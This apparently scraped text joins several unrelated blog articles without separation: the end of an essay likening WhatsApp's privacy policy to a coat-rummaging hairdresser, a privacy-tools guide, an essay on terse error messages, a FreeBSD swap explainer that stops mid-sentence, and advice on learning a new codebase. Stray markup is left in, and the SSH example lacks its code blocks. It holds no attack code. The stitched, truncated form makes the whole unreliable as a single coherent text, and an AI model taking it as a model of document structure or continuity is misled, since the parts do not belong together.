can still find it, but it’s even more difficult to find than before. With the camera at least I had something I could focus my anger on (and could potentially smash). Without any identifiable person or object committing these acts, the act itself seems to slowly lose the property of being something one could potentially object to.</p><p>My outrage seems to require at a minimum a crime and a perpetrator. I struggle to find those here. Only by invoking the analog equivalent from before and by imagining an actual person committing these acts do I feel outrage. But equating this last scenario to the analog equivalent feels slightly awkward; an oversimplification. As a result, the outrage doesn’t transfer fully from one scenario to the other.</p><p>By changing the process through which the information was extracted while keeping the outcome (the extracted data) the same, my outrage circuitry has almost entirely been bypassed. This was achieved by making the scenario more abstract, instantaneous, invisible and by making the actor an inanimate, unidentifiable piece of technology.</p><p>Now, one final step. Imagine we hadn't started with the analog example of the rummaging hairdresser and the emotional memory of how that made you feel. Imagine instead we would have started with the invisible, instantaneous, inanimate technology. Would you have been able to feel any outrage? Any whatsoever? Would you naturally think of coming up with an analog equivalent scenario to gauge your outrage?</p><p>You actually don't need to imagine the last example. If you're currently using WhatsApp, you're living inside of it. The hairdresser represents Facebook and the coat rummaging policy represents their new privacy policy, or Facebook's general conduct for that matter. If you don't feel outrage, then perhaps that's because you haven't imagined the analog equivalent of what's happening yet (which isn't always self-evident, that’s what I’ve tried to help you with here) <sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p><p>The key observation to note here is that the outrage that gets triggered inside of you gets modulated by <em>the manner in which</em> your information gets extracted, not so much <em>if</em> it gets extracted. It's as if robbing someone of $100 would somehow be less outrageous if you did it through the internet rather than snatching it directly from their wallet.</p><p>In a high-tech society, where we’re surrounded by technological abstractions upon abstractions, should we only be relying on our instinctual outrage circuits to be our moral compasses when they can so easily be fooled?</p><p><em>Even though the hairdresser in this story (Facebook / WhatsApp) is rummaging through your coat, there are many reputable hairdressers (messaging services) that do not. My favourite alternative is <a href="https://signal.org/">Signal</a> <sup id="fnref-7"><a href="#fn-7">7</a></sup>, but I've heard good things about <a href="https://threema.ch/">Threema</a> and although I don't get the impression the technology is accessible enough to port my friends and family, I'm supportive of what <a href="https://matrix.org/">Matrix</a> is trying to accomplish.</em></p></div></article></div>]]>

    <h2 id="the-need-for-privacy">The need for privacy</h2>
<blockquote>
<p>Why should I care about privacy, I have nothing to hide</p>
</blockquote>
<p>Until a few years back, this question was very difficult to answer. People always perceived privacy in the physical sense. No one grasped the concept of digital privacy, let alone care about it.</p>
<p>You wouldn’t want a stranger to enter your home uninvited, right? So why treat your digital world any different. Your digital world contains private information like conversations, interactions, interests, and transactions that are worth protecting.</p>
<p><img src="https://yashmehrotra.com/images/privacy-snowden-quote.png" alt="Snowden Quote"></p>
<p>With invasive ads and all websites you visit keeping a track of you, I would say a breaking point will be reached soon. In action, it would be defined as when someone would go the inconvenient way of achieving a task to preserve their privacy.</p>
<p>The harsh truth is, <a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a> is <a href="https://thereader.mitpress.mit.edu/tech-companies-are-profiling-us-from-before-birth/">real</a>, and it is <a href="https://qz.com/1950685/instagrams-shop-tab-shows-the-dangers-surveillance-capitalism/">rising</a>. With FAAG (Facebook, Apple, Amazon &amp; Google) either buying every company or eliminating them by copying their feature’s which remotely threaten them, they are centralizing all your data. Google recently acquired FitBit (a fitness tracker manufacturing company) only to have an <a href="https://www.theverge.com/2020/8/4/21353947/google-fitbit-acquisition-eu-investigation-antitrust-health-tracking-data">anti-trust investigation launched</a> against them with fears over Google misusing health data.</p>
<p>Fortunately, as times changed, people’s mindsets changed as well. They started realizing that the lives they live digitally have significance too. And those who still weren’t quite convinced, Facebook and Google ironically played a major role in persuading them their privacy is actually at stake by crossing the line far too many times.<img src="https://yashmehrotra.com/images/privacy-news-articles.png" alt="They just don’t care"></p>
<p>The question which arises is what can we do? Are we becoming too set in our ways or can we take back what should have always belonged to us,  our privacy.</p>
<h2 id="why-an-eventual-compromise-is-the-answer">Why an eventual compromise is the answer</h2>
<p>Going off the grid is impractical. Migrating away from an entire ecosystem is strenuous. The FAAG are here to stay.</p>
<p>An eventual compromise here means restricting yourself to use only a few services provided by those companies but only limited to that. A trade-off essentially and making your peace with it.</p>
<p>The bitter reality is that distancing yourself from these services comes at a greater cost of convenience. While there are some extremists who have taken those difficult steps, they also have to convince their friends and family as well to make the switch.</p>
<p>As much as you may disgust Facebook, you might still have to use WhatsApp because everyone else already does, it is more of a necessity now. Albeit, Signal is gaining some much deserved popularity recently, it is still miles away from WhatsApp’s market cap.</p>
<p>Ever thought of removing Google entirely from your life? It is nerve-racking.</p>
<p>This is where trade-offs and calculated risks come into place. Rather than going cold turkey on the services deeply rooted in our lives, we choose to be aware of what information do they have about us and the risks that they pose. We take a conscious call knowing how much and what kind of data are we sharing and what we are getting in exchange.</p>
<h2 id="evaluation-criteria">Evaluation criteria</h2>
<p>Everyone has a different framework when it comes to choosing the tool to use.</p>
<p>Some people value ease of use whilst others may value integrations with different software.</p>
<p>Some would value privacy over functionality, others may not.</p>
<p>Some prefer to go for self-hosted tools whereas a huge part of the population don’t even know what that means.</p>
<p>This depends on person to person and use case to use case, think one of your own.</p>
<p>While deciding, also keep in mind the privacy laws of your country (esp. Key disclosure law) and whether the service you are using is part of <a href="https://restoreprivacy.com/5-eyes-9-eyes-14-eyes/">5-9-14 eyes</a>. If you think this is too extreme, you can just skim through the Privacy Policy and see whether you are comfortable with the data they are capturing and sharing with their third-party services.</p>
<p>The <a href="https://www.privacytools.io/">privacytools.io</a> website could be your guide for this process.</p>

<p><strong>Browser: Firefox</strong></p>
<p>I use Firefox because of its simplicity, care for user’s privacy, and <a href="https://www.mozilla.org/en-US/about/manifesto/">Mozilla’s commitment to keeping the web an open platform</a>. Feature-wise, Firefox is at par with other browsers and I have found it to be less RAM hungry than Chrome.</p>
<p>Extensions:</p>
<ul>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">Multi-account containers: </a> It lets you keep parts of your online life separated into color-coded tabs that preserve your privacy. For eg. I have containers for Personal, Work, Google, Banking, Shopping, etc. This ensures that cookies aren’t shared between those containers and is essentially equivalent to using a different browser. My goal for this year is to not see a single relevant advertisement.</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">uBlock Origin</a>: Block all the unwanted trackers (You can also install this on your mobile phone).</li>
<li>You can also go through this <a href="https://blog.mozilla.org/firefox/make-your-firefox-browser-a-privacy-superpower-with-these-extensions/">list of privacy enhancing extensions curated by Mozilla</a>.</li>
</ul>
<p><strong>Storage</strong></p>
<p>Since the dawn of the digital age, we have accumulated massive amount of data over the years. After all, we use multiple devices each of which have their own storage. But keep in mind that these are our private files and should be kept with a company that respects our privacy.</p>
<ul>
<li>I personally use pCloud. It is the least of all the evils (although they charge extra for zero knowledge encrypted storage).</li>
<li><a href="https://protonmail.com/blog/proton-drive-early-access/">ProtonDrive</a> is also releasing soon which seems promising.</li>
<li>If you want to self-host, Nextcloud and Syncthing are good.</li>
<li>Just do not go for Google Drive, iCloud or OneDrive.</li>
<li>Follow the 3-2-1 backup rule: At least 3 copies of your data in 2 different locations, 1 of which needs to be off-site.</li>
</ul>
<p><strong>Email</strong></p>
<ul>
<li>Slowly moving to <a href="https://protonmail.com/">ProtonMail</a> for primary mail. Privacy is their unique selling point.</li>
<li>Gmail due to legacy reasons. A lot of critical accounts and contacts still have that email.</li>
</ul>
<p><strong>Communication</strong></p>
<ul>
<li>Use Signal</li>
<li>Avoid WhatsApp, Facebook will eventually get rid of the end-to-end encryption.</li>
<li>Story Time: After selling Whatsapp to Facebook, the founder Brian Acton was assured that end-to-end encryption won’t be removed and they’ll figure other ways to monetize it. Though Facebook failed to keep their end of the deal, which ended up with Brian Acton donating $50 million USD to Open Whisper Foundation (Signal’s Parent organization).</li>
</ul>
<p><strong>Password management</strong></p>
<ul>
<li>Use a password manager. Period.</li>
<li>Use different passwords for different websites so that in case one company’s database gets breached, you wouldn’t have to worry about other websites (All the password managers have password generation functionality).</li>
<li>I personally advocate for <a href="https://bitwarden.com/">Bitwarden</a>, but <a href="https://www.lastpass.com/">Lastpass</a> and <a href="https://1password.com/">1password</a> are good too.</li>
<li>Keep in mind that your password manager will be your single point of failure so you need to make sure that the masters password is extremely strong.</li>
</ul>
<p><strong>VPN</strong></p>
<ul>
<li>Not easy to choose, they all have pro’s and con’s. Use <a href="https://privacytools.io/providers/vpn/">privacytools’s VPN page</a> to choose and also take a look at country of origin and their logging policy.</li>
<li>Tor Browser is the best for anonymous browsing but some of the websites you use may break over there.</li>
</ul>
<p><strong>Search Engine</strong></p>
<ul>
<li>I know, I know, the others are not as good as Google. But they are not all that bad. I’ve been using <a href="https://duckduckgo.com/">DuckDuckGo</a> for quite sometime and it works 95% of the time, and is improving constantly.</li>
<li>The problem with Google is not only does it scan and analyze all your searches, it has its <a href="https://www.rt.com/usa/503964-whistleblower-google-skews-results/">own biases</a> and is known for <a href="https://www.theregister.com/2020/10/21/google_search_iframe/">skewing the results</a> as <a href="https://www.ccn.com/google-manipulates-search-results-former-engineer-shockingly-confirms/">they see fit</a>.</li>
</ul>
<h2 id="behavioral-changes-you-can-make">Behavioral changes you can make</h2>
<p>When it comes to a certain behavior, our brains are hard-wired to do things subconsciously that we ourselves may not be aware of. Companies research and study this behavior, and do their best to exploit this.</p>
<p>Here are a few common things that you can start with:</p>
<ul>
<li>
<p>No need to tell EVERYONE your email</p>
<ul>
<li>Use a temporary email if you just want to check out a site that requires account creation. Services like <a href="https://temp-mail.org/">TempMail</a> can be used to get temporary emails.</li>
<li>It will help you reduce the unwanted amount of spam.</li>
</ul>
</li>
<li>
<p>Don’t share unnecessary details</p>
<ul>
<li>If a site asks for your birthday or gender, don’t give it.</li>
<li>Don’t fill out all the details of the profile page unless the functioning of the website is being effected.</li>
<li>James Jani, a YouTuber <a href="https://www.youtube.com/watch?v=uZ2l-kk5ihk">explains how this data eventually ends up being sold to the highest bidder</a>.</li>
</ul>
</li>
<li>
<p>Use incognito mode if you are just browsing and don’t want a persistent session</p>
<ul>
<li>This applies to all searches and website visits. The rule of thumb I follow is: If you have to login, use a normal window, else go incognito.</li>
<li>Incognito mode does not hide your browsing from service providers, but it makes it harder for ad networks to track you across different websites.</li>
</ul>
</li>
<li>
<p>The whole world is watching philosophy</p>
<ul>
<li>For social media sites like Instagram/Twitter/Facebook: Assume everything you post is public. It would not just be viewed by your friends or followers, everyone can see what you post.</li>
<li>This comes under the “Eventual compromise” we discussed earlier, we are aware of the negative consequences but we take a call because <del>we want to be up to date with the memes</del> these websites can have a positive effect if we use them the right way.</li>
</ul>
</li>
<li>
<p>Avoid “smart” devices</p>
<ul>
<li>Both Amazon and Google’s home devices have been caught listening to user’s when they weren’t supposed to.</li>
<li><a href="https://www.theguardian.com/technology/2019/oct/09/alexa-are-you-invading-my-privacy-the-dark-side-of-our-voice-assistants">Amazon’s echo apparently sent their owner’s recordings to someone else without their permission or knowledge</a> and <a href="https://www.cnbc.com/2019/07/11/google-admits-leaked-private-voice-conversations.html">Google just doesn’t care enough once they acquire the data</a>.</li>
</ul>
</li>
<li>
<p>Review your phone’s app permissions</p>
<ul>
<li>Mobile apps would try their hardest to get as many data points as they can which often includes sending &amp; connecting to trackers automatically in the background.</li>
<li>Be aware of which apps have critical permissions like location, microphone &amp; camera.</li>
<li>Android and iOS did introduce the “Allow permission just for now” functionality to curb this.</li>
</ul>
</li>
</ul>
<blockquote>
<p>If you are not paying for the product, then the gradual changes in your behavior &amp; perception is the product</p>
<p>– Jaron Lanier (The Social Dilemma)</p>
</blockquote>

<ul>
<li>It may be hard to, but get off Facebook. It went from being a good social media platform to catch-up with your peers but now it has turned into a tool used to “program people’s thoughts”. <a href="https://www.youtube.com/watch?v=MakEIlvlyfE">Here is a former Facebook exec talking about how it is tearing apart the fabric of society</a>.</li>

<p>Let's compare some error messages -- specifically, the ones that occur when
you try to execute a nonexistant command in Windows PowerShell and GNU
Bash.</p>
<p>PowerShell:</p>
<pre><code>PS C:\&gt; lorem --ipsum dolor -sit amet
lorem : The term 'lorem' is not recognized as the name of a cmdlet, function, script file, or operable program.
Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ lorem --ipsum dolor -sit amet
+ ~~~~~
+ CategoryInfo          : ObjectNotFound: (lorem:String) [], CommandNotFoundException
+ FullyQualifiedErrorId : CommandNotFoundException

PS C:\&gt; exit
</code></pre>
<p>and GNU Bash:</p>
<pre><code>$ lorem --ipsum dolor -sit amet
bash: lorem: command not found
$ 
</code></pre>
<p>The first thing you'll notice is that PowerShell's output is far, <em>far</em>
more verbose. You've got an error, a nice helpful message suggesting that
you "check the spelling of the name and try again", and a stack trace.
Meanwhile, <code>bash</code> just tells you <code>command not found</code>.</p>
<p>So: which error message is better?</p>
<p>Eric Raymond, in his excellent book <em>The Art of UNIX Programming</em>, explains
that a good UNIX program should output the least amount of stuff that it
can, a rule he calls the "Rule of Silence":</p>
<blockquote>
<p>One of Unix's oldest and most persistent design rules is that when a
program has nothing interesting or surprising to say, it should <em>shut
up</em>. Well-behaved Unix programs do their jobs unobtrusively, with a
minimum of fuss and bother. Silence is golden.</p>
<p>This "silence is golden" rule eveolved originally because Unix predates
video displays. On the slow printing terminals of 1969, each line of
unnecessary output was a serious drain on the user's time. That
constraint is gone, but excellent reasons for terseness remain. (Raymond,
43)</p>
</blockquote>
<p>He quotes Ken Arnold:</p>
<blockquote>
<p>...important information should not be mixed in with verbosity about
internal program behaviour. If all displayed information is important,
important information is easy to find.</p>
</blockquote>
<p>Raymond continues:</p>
<blockquote>
<p>Well designed programs treat the user's attention and concentration as a
previous and limited resource, only to be claimed when necessary.
(Raymond, 44)</p>
</blockquote>
<p>It is Arnold's quote that I'd like to expand on. Not only should you not
include unimportant information, but you should also output the important
stuff in the tersest possible form.</p>
<p>Why? Because <strong>users don't like reading.</strong></p>
<p>When a user is using a particular application, they are usually trying to
get something done. They may be trying to check their email, launch an IM
client, or start their browser. Reading stuff takes time, and thus slows
the user down. Because of this, users will do the minimal amount of reading
that they can.</p>
<p>Therefore, a terse error message is more likely to get properly read than a
verbose error.</p>
<p>"But wait! PowerShell's message is more user-friendly, because it reminds
the user to check their spelling!" Pffft. Anyone smart (for lack of a
better word!) enough to use PowerShell will know that they should
double-check their spelling without an error message telling them to do so.</p>
<p>And even in "normal" applications -- where the majority of users are not
knowledgable enough to know that their spelling could be to blame -- an
error message that's too verbose is <em>still</em> problematic, because many, if
not most, non-techy users won't bother reading it!</p>
<p>And if you <em>simply must include</em> a help/hint message -- do so in a way that
won't distract the user from the actual error.</p>
<p>For example, just look at the default Windows error message for an
incorrect password:</p>
<blockquote>
<p>You can't sign into your device right now. Go to account.live.com to fix
the problem, or try the last password you used on this device.</p>
</blockquote>
<p>Now, this could have just been written as</p>
<blockquote>
<p>Login incorrect</p>
</blockquote>
<p>which is the error message that's displayed on Linux when a user attempts
to login from a TTY.</p>
<p>However: a "Windows account" is actually a Microsoft account, and the
password is the same. Which means that if a user changes her Microsoft
account password on another device, and then tries to login on another
device that hasn't connected to the internet yet and received the new
password, she will have to use the last password she used on that
particular device.</p>
<p>Most users, however, probably won't realize this in such
a scenario, so it's OK to say that in the error message. The trick is to
include it in such a way so as to not make the error message seem too long:</p>
<blockquote>
<p><strong>Incorrect password</strong></p>
<hr>
<p><em>Note: try using the last password you used on this device.</em></p>
</blockquote>
<p>Notice how the main error ("Incorrect password") is in bold, and the hint,
two lines below, was in italics. I didn't put the hint in
<small>small</small> text, because that would give the impression to a
naive user that it was some kind of legal/technical message that she
doesn't have to pay attention to.</p>
<h2 id="anti-case-studies">(anti-)case studies</h2>
<h3 id="google">Google</h3>
<p>Take a look at the error message given when your Google search didn't turn
up anything:</p>
<blockquote>
<p>Your search -- <strong>asdf;asdf;asdf;asdf;asdf;asdf;as...</strong> did not match any
documents.</p>
<p>Suggestions:</p>
<ul>
<li>Make sure all words are spelled correctly.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>For one thing, repeating the entire search query in bold isn't necessary.
The user already knows what they searched for.</p>
<p>The suggestions, however,
are OK since they are visually separate from the error.</p>
<p>Fixed:</p>
<blockquote>
<p><strong>No results found.</strong></p>
<hr>
<p>Tips:</p>
<ul>
<li>Check your spelling.</li>
<li>Try different keywords.</li>
<li>Try more general keywords.</li>
<li>Try fewer keywords.</li>
</ul>
</blockquote>
<p>Notice how I condensed the main error message and the first suggestion,
and replaced <code>Suggestions:</code> with <code>Tips:</code>.</p>
<h3 id="ssh">SSH</h3>
<pre><code>$ ssh tilde.zone

<p>I see several things wrong:</p>
<ul>
<li>the first line (<code>The authenticity of host can't be established</code>) is too verbose.</li>
<li>the second line (<code>ECDSA key fingerprint is...</code>) is too verbose.</li>
<li>the prompt to continue to way too verbose.</li>
<li>the warning is too verbose.</li>
<li>the <code>permission denied</code> error is just a little bit too verbose.</li>

<p>Fixed:</p>

<p>As you can see, I've condensed the first line, continue prompt, and warning
quite a bit; I've also changed the second line to not be a sentence, thus
eliminating a whole two letter word ;)</p>
<p>The warning has been changed to not repeat the host and ip address, which
was already listed previously. The completely unnecessary <code>please</code>
has been removed from the password error.</p>
<h3 id="su"><code>su</code></h3>
<p>The example with the shortest name also has the shortest error message,
<code>su</code>:</p>
<pre><code>$ su
Password:
su: Authentication failure
</code></pre>
<p>Notice the beautifully terse error message.</p>
<p>(And if you're wondering why <code>su</code> just doesn't say <code>incorrect password</code>,
it's probably due to <code>su</code> being incapable of knowing whether it's really
the password that was wrong, or the username, or something else.)</p>
<h3 id="gnu-cat">GNU <code>cat</code></h3>
<p><code>cat</code>'s error on an incorrect path is terse, but not terse enough:</p>
<pre><code>$ cat invalid
cat: invalid: No such file or directory
$
</code></pre>
<p>Why say "no such file or directory"? <code>cat</code> doesn't even read directories!</p>
<p>Solution:</p>
<pre><code>$ cat invalid
cat: invalid: invalid path
</code></pre>
<p><em>more case studies will be added as I find them.</em></p>
<h2 id="conclusion">conclusion</h2>
<p>Terser is better. Software isn't the place to show off your writing skills.</p>
<p>And if you really must include some kind of hint or suggestion, make it
visually separate from the error message.</p>

<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, “<em>swapping</em>” refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common “solution” is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU – it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system’s memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>

</div></div>




</div></div>



<p>“<em>Wired</em>” pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process’ address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the “page daemon” periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be “dirty” and before it can be reused its contents must be paged out to storage. Otherwise, the page is “clean.” For example, if one searches a file using grep(1), that file’s data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>

<p><strong>To summarize:</strong></p>



<p>– The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>– To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>– When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>– If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control “background” laundering, while the third is used to drive “shortfall” laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page’s contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page’s contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean – only if the data is written to will the page be marked dirty – so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system – the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be …</p></div></div></div>

<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you’ll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you’re running and packages you’re installing. You’re bound to run into something that’s changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
